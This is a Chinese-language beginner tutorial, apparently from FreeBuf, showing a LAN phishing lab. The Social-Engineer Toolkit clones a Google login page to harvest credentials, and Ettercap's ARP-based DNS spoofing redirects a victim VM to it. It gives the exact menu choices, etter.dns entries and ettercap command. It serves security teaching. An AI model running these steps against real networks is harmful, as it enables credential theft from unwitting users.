@@ -1,0 +1,179 @@
+>
+> **声明：文中提及的部分技术可能具有一定攻击性，仅供安全学习和教学用途，禁止非法使用！本人也是刚刚接触Web安全，文章如有不当之处，欢迎大家指正，谢谢！**
+
+## 0x00 背景
+
+ **本文主要是面向刚刚接触Web安全的新手，通过实验展示了，如何通过`SET`和`Ettercap`实现内网钓鱼窃取帐号密码。**
+
+`SET`全称`Social Engineering
+Toolkit`。顾名思义，主要用来进行社工攻击，包括钓鱼网站，无线AP攻击，QRCode攻击等等。在本次实验中，SET主要用来搭建钓鱼网站，以及监听HTTP请求中发送的帐号密码。
+
+`Ettercap`是一个老牌的实施MITM攻击的软件。在本次实验中，Ettercap用于进行DNS欺骗，将用户访问的域名解析到攻击者伪造的钓鱼网站的IP地址，从而达成监听请求的目的。
+
+## 0x01 实验环境
+
+本次实验在虚拟机环境下进行，攻击主机和目标主机处于同一局域网网段。
+
+    
+    
+    虚拟机软件：HyperV (Windows 10 Pro自带)
+    攻击主机：Kali Linux IP: 172.20.86.90
+    目标主机：Windows 10 IP: 172.20.86.88
+    
+
+![topological_graph](https://image.3001.net/images/20180909/1536487731_5b94f133a7450.png)
+
+## 0x02 实验步骤
+
+本次实验主要包括两个部分：一个是利用SET快速搭建一个钓鱼网站，并监听访问网站的请求，二是将域名解析到伪造的钓鱼网站的IP地址。
+
+### 1\. SET搭建钓鱼网站
+
+由于Kali内置了SET，无需安装，直接使用命令`setoolkit`启动SET。
+
+    
+    
+     Select from the menu:
+       1) Social-Engineering Attacks  // 选择1，社会工程学攻击
+       2) Penetration Testing (Fast-Track)
+       3) Third Party Modules
+       4) Update the Social-Engineer Toolkit
+       5) Update SET configuration
+       6) Help, Credits, and About
+       ......
+       99) Exit the Social-Engineer Toolkit
+    
+
+首先，选择菜单中第一个选项，社会工程学攻击。
+
+    
+    
+    1) Spear-Phishing Attack Vectors
+    2) Website Attack Vectors  // 选择2，网站攻击
+    3) Infectious Media Generator
+    4) Create a Payload and Listener
+    5) Mass Mailer Attack
+    6) Arduino-Based Attack Vector
+    7) Wireless Access Point Attack Vector
+    8) QRCode Generator Attack Vector
+    9) Powershell Attack Vectors
+    10) SMS Spoofing Attack Vector
+    11) Third Party Modules
+    
+
+然后，选择菜单中第二个选项，网站攻击。
+
+    
+    
+    1) Java Applet Attack Method
+    2) Metasploit Browser Exploit Method
+    3) Credential Harvester Attack Method  // 选择3，窃取凭证
+    4) Tabnabbing Attack Method
+    5) Web Jacking Attack Method
+    6) Multi-Attack Web Method
+    7) Full Screen Attack Method
+    8) HTA Attack Method
+    
+
+选择第三个选项，窃取凭证。
+
+    
+    
+    1) Web Templates  // 使用预定义的网站模板
+    2) Site Cloner    // 克隆网页
+    3) Custom Import  // 从指定目录导入网站
+    
+
+在此，为了方便，我们直接选择1，使用SET中内置的网站模板来进行实验。
+
+    
+    
+    set:webattack> IP address for the POST back in Harvester/Tabnabbing [172.20.86.90]:
+    
+
+直接回车，使用默认IP，即Kali的局域网IP。
+
+    
+    
+    1. Java Required
+    2. Google
+    3. Twitter
+    
+
+选择2，使用Google登录页面作为钓鱼网站。
+
+    
+    
+    [*] The Social-Engineer Toolkit Credential Harvester Attack
+    [*] Credential Harvester is running on port 80
+    [*] Information will be displayed to you as it arrives below:
+    
+
+此时，SET打印出提示，钓鱼网站已经搭建完毕，访问端口为`80`。如果有网页访问信息，那么控制台会将其打印出来。
+
+打开目标主机Win10的浏览器，地址栏输入`172.20.86.90`，即可访问刚才搭建成功的钓鱼网站，Google的登录页面。
+
+![win10_victim_google_login_ip](https://image.3001.net/images/20180909/1536489107_5b94f6933ea4e.png)
+
+同时，SET的控制台打印出来一条访问请求记录。
+
+![set_console_log](https://image.3001.net/images/20180909/1536489344_5b94f78007689.png)
+
+### 2\. Ettercap DNS欺骗
+
+Kali默认也安装了Ettercap。Ettercap有命令行和图形界面两种模式可以使用，在此直接选择使用命令行模式。
+
+首先，输入`vim
+/etc/ettercap/etter.dns`配置DNS转发。添加如下内容，将对于`google.com`域名的访问转发到`172.20.86.90`(Kali攻击主机IP)。
+
+    
+    
+    // etter.dns
+    google.com       A      172.20.86.90
+    *.google.com     A      172.20.86.90
+    www.google.com   PTR    172.20.86.90
+    
+
+配置完成后，使用如下命令启动Ettercap。
+
+    
+    
+    ettercap -i eth0 -T -P dns_spoof -M arp /172.20.86.88///
+    
+
+简单解释一下这几个参数的含义。更详细的文档，请使用`man ettercap`查看
+
+    
+    
+    -i 指定网卡 eth0
+    -T 使用文本模式
+    -P 指定Plugin dns_spoof
+    -M 开启MITM arp
+    
+
+![ettercap_start_success.png](https://image.3001.net/images/20180909/1536489580_5b94f86c890ac.png)
+
+可以看到，成功启动Ettercap后，已对目标主机(172.20.86.88)实施DNS欺骗。
+
+## 0x03 场景模拟
+
+用户在Win10下，打开Edge浏览器，在地址栏输入google.com。这是Google登录页面弹出。
+
+![win10_victim_google_login_url.png](https://image.3001.net/images/20180909/1536489512_5b94f828e4ea1.png)
+
+用户输入帐号`test@gmail.com`，密码`p@ssw0rd`，回车进行登录。
+
+打开SET控制台，即可发现捕捉到了这次登录的请求，成功窃取帐号密码。
+
+![set_got_a_hit.png](https://image.3001.net/images/20180909/1536489519_5b94f82f47283.png)
+
+## 0x04 总结
+
+本次实验，主要是通过DNS欺骗转发用户请求到钓鱼网站，从而实现窃取用户的登录信息。但是存在以下不足：
+
+1.未考虑HTTPS的情况，HTTPS的访问不会转发到目标IP。
+
+2.钓鱼网页的点击登录后，应该跳转到正常的网站首页，而不是仍停留在登录页面。
+
+ ***本文原创作者：kenmick，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
